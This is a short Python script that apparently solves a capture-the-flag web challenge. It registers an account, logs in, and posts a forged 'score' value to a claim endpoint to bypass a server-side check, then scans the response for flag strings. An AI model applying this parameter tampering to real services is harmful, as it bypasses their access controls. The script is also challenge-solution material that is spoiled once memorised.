import requests

base = 'https://web-random-cheese.tracebash.xyz'

# Create fresh session
s = requests.Session()
s.post(f'{base}/register', data={'username': 'exploit99', 'password': 'exploit99'})
s.post(f'{base}/login', data={'username': 'exploit99', 'password': 'exploit99'})

# Now claim with score param - this should bypass the score check
r = s.post(f'{base}/claim', data={'score': '85'})

# Save to file for analysis
with open('output.html', 'w', encoding='utf-8') as f:
    f.write(r.text)

# Search for flag pattern
import re
for match in re.findall(r'[A-Z]{3,}\{[^}]+\}', r.text):
    print(f'FLAG FOUND: {match}')

# Also check for any CTF flag patterns
for match in re.findall(r'CTF\{[^}]+\}', r.text):
    print(f'FLAG CTF: {match}')

# Print lines containing flag
for line in r.text.split('\n'):
    if 'flag' in line.lower() or 'ctf' in line.lower() or 'congratulations' in line.lower():
        print(line.strip())

print('\nFirst 1000 chars:')
print(r.text[:1000])